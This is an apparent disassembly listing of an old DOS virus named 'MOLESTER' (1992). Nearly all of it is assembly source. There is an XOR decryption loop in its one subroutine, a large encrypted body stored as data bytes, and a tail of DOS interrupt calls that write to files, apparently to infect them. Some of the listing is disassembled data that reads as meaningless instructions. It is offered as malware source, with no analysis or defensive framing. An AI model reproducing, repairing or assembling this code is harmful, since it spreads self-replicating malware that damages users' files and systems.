
PAGE  59,132

;==========================================================================
;==					                                 ==
;==				MOLESTER                                 ==
;==					                                 ==
;==      Created:   18-Apr-92		                                 ==
;==      Passes:    5          Analysis	Options on: QRSU                 ==
;==					                                 ==
;==========================================================================


seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

MOLESTER	proc	far

start:
		jmp	real_start		; (0106)
			                        ;* No entry point to code
		int	10h			; Video display   ah=functn 00h
						;  set display mode in al
		retn

;==========================================================================
;
;                       External Entry Point
;
;==========================================================================

real_start:					;  xref 580C:0100
;*		jmp	short loc_1		;*(010C)
		db	0EBh, 04h
			                        ;* No entry point to code
		nop
		dec	si
		pop	ss
		add	bh,[bp+di+101h]
		mov	ah,[bx]
		mov	bx,102h			; (580C:0102=0)
		mov	al,[bx]
		xchg	al,ah
		add	ax,3
		mov	si,ax
		mov	cl,byte ptr ds:[103h][si]	; (580C:0103=0CDh)
		call	sub_1			; (0308)
		cmpsw				; Cmp [si] to es:[di]
		into				; Int 4 on overflow
		dec	si
		db	 64h, 60h, 0Dh, 01h, 03h, 4Eh
		db	 6Eh, 3Bh,0F2h,0DCh
		db	'VHNNNteten'

		db	1Ah
		db	'&+n', 0Ah, '/:/n'
		db	3
		db	'!"+=:+<n'
		db	 18h, 27h, 3Ch, 3Bh, 3Dh, 6Eh
		db	 18h, 7Fh
		db	'`!!netetDCf-g'
		db	 7Fh, 77h, 77h, 7Ch, 6Eh, 03h
		db	 2Fh, 14h, 6Eh, 68h, 6Eh, 1Ah
		db	 26h, 2Bh, 6Eh, 18h, 27h, 22h
		db	 2Bh, 6Eh, 01h, 20h, 2Bh, 6Eh
		db	 61h, 6Eh, 1Ah
		db	 26h, 2Bh, 6Eh
		db	0Ch, '+:/', 0Ch, '!7=n', 0Ah, '+8'
		db	'+"!>#+ :n', 0Dh, '!<>!</:'
		db	 27h, 21h, 20h, 60h, 44h, 43h
		db	0A7h, 4Dh, 4Eh,0F6h,0FAh, 54h
		db	0C3h,0DAh, 59h, 4Dh,0CDh, 8Ch
		db	 48h, 83h, 6Fh,0FAh, 00h,0C3h
		db	0DAh, 6Fh, 4Fh,0F7h, 48h, 4Eh
		db	 83h, 6Fh, 73h, 5Ch, 4Eh, 3Ah
		db	 10h,0A5h, 40h,0DEh,0FAh, 70h
		db	 83h, 6Fh,0FAh, 01h, 83h, 6Fh
		db	 73h, 5Ch, 4Eh, 3Ah, 00h, 18h
		db	0C9h,0BBh,0C3h,0F8h, 62h, 4Dh
		db	0CDh, 88h, 48h,0F7h, 47h, 4Eh
		db	0C3h,0F0h, 69h, 4Fh,0BDh,0EAh
		db	 10h,0FAh
loc_2:						;  xref 580C:01E7
		jnc	loc_2			; Jump if carry=0
		dec	sp
		retn
		db	0DAh, 59h, 4Dh,0CDh, 8Ch, 6Ah
		db	 83h, 6Fh,0C5h, 96h,0F6h, 4Fh
		db	 0Dh, 7Dh, 87h, 83h, 6Fh,0A6h
		db	 97h, 4Eh, 1Eh, 63h, 48h, 4Eh
		db	0C5h
loc_3:						;  xref 580C:020B
		sahf				; Store ah into flags
		dec	byte ptr [bp-5Ah]
		pushf				; Push flags
		dec	si
		cli				; Disable interrupts
		jno	loc_3			; Jump if not overflw
		dec	di
		dec	si
		retn
		db	0DAh,0EEh, 4Fh, 83h, 6Fh,0C4h
		db	0EAh,0EEh, 4Fh,0CEh,0B2h, 0Ch
		db	 3Bh, 4Bh,0A5h,0EBh,0A5h, 1Eh

		db	0DEh, 7Ch, 8Eh,0A6h,0FCh, 4Eh
		db	0F6h, 4Eh, 71h,0F7h, 4Dh, 4Eh
		db	0C3h,0DAh, 59h, 4Dh,0CDh, 8Ch
		db	 4Dh, 83h, 6Fh, 7Ch, 8Eh,0A6h
		db	0D0h, 4Eh, 16h, 63h, 4Dh, 4Eh
		db	0C6h,0CAh,0D0h, 4Fh,0C6h,0EAh
		db	0D1h, 4Fh,0FAh, 0Eh,0F7h, 4Dh
		db	 4Eh,0C3h,0DAh,0D3h, 4Fh, 83h
		db	 6Fh,0A6h,0CCh, 4Eh,0C5h,0B5h
		db	0A6h,0C6h, 4Eh,0C5h, 91h,0A6h
		db	 36h, 4Eh,0F6h, 4Eh, 0Eh,0C3h
		db	0DAh, 59h, 4Dh,0CDh, 8Ch, 4Dh
		db	0F7h, 4Dh, 4Eh, 83h, 6Fh,0A5h
		db	 4Fh,0DEh,0F6h, 4Fh, 19h,0C5h
		db	0DAh, 64h, 4Fh,0C5h,0C2h, 66h
		db	 4Fh, 83h, 6Fh,0FAh, 70h, 83h
		db	 6Fh,0F6h, 4Fh, 0Dh,0C3h,0DAh
		db	 59h, 4Dh,0CDh, 8Ch, 6Ah, 7Ch
		db	0A3h,0C4h,0C2h, 69h, 4Fh, 83h
		db	 6Fh,0F7h, 4Dh, 4Eh,0C3h,0CAh
		db	 59h, 4Dh,0C5h,0BEh,0F1h, 4Eh
		db	 4Fh,0BDh,0EAh,0FAh, 64h, 83h
		db	 6Fh,0CEh,0B0h, 4Bh, 3Bh, 46h
		db	0CEh,0B4h, 42h, 3Bh, 4Dh,0A5h
		db	 45h,0DEh,0CEh,0B0h, 4Ch, 3Bh
		db	 5Bh,0CEh,0B4h, 57h, 3Bh, 5Eh
		db	0FEh, 4Ch,0F7h,0BAh, 4Fh,0F4h
		db	 4Eh, 4Eh, 83h, 68h,0B0h, 8Eh
		db	 72h, 4Ah, 3Bh,0BCh,0A6h, 4Ch
		db	 4Eh, 83h, 6Eh,0F1h, 4Eh, 4Fh
		db	0B1h,0A9h,0FEh, 4Ch, 7Dh, 9Ch
		db	 7Dh, 87h,0FAh, 0Ch, 83h, 6Fh
		db	 8Dh,0B4h, 2Ch,0CDh, 21h, 86h
		db	0D1h, 32h,0EDh, 51h,0E8h, 19h
		db	 00h, 59h, 88h, 8Ch, 03h, 01h
		db	 51h, 8Bh,0DFh,0B4h, 40h, 8Dh
		db	 94h, 00h, 01h, 8Bh, 8Ch, 04h
		db	 01h,0CDh, 21h, 59h,0E8h, 01h
		db	 00h,0C3h

MOLESTER	endp

;==========================================================================
;                              SUBROUTINE
;
;         Called from:   580C:0121
;==========================================================================

sub_1		proc	near
		lea	bx,ds:[11Eh][si]	; (580C:011E=8Ch) Load effective addr
		lea	dx,cs:[2DDh][si]	; Load effective addr
loc_4:						;  xref 580C:0317
		cmp	bx,dx
		je	loc_ret_5		; Jump if equal
		xor	[bx],cl
		inc	bx
		jmp	short loc_4		; (0310)


loc_ret_5:					;  xref 580C:0312
		retn
sub_1		endp

		db	 42h, 2Eh, 42h,0B8h, 07h, 0Eh

seg_a		ends



		end	start


____________________ CROSS REFERENCE - KEY ENTRY POINTS ___________________

    seg:off    type	   label
   ---- ----   ----   --------------------------------
   580C:0100   far    start
   580C:0106   extn   real_start

 __________________ Interrupt Usage Synopsis __________________

        Interrupt 10h : Video display	ah=functn xxh
        Interrupt 10h :  ah=00h	 set display mode in al

 __________________ I/O Port Usage Synopsis  __________________

        No I/O ports used.

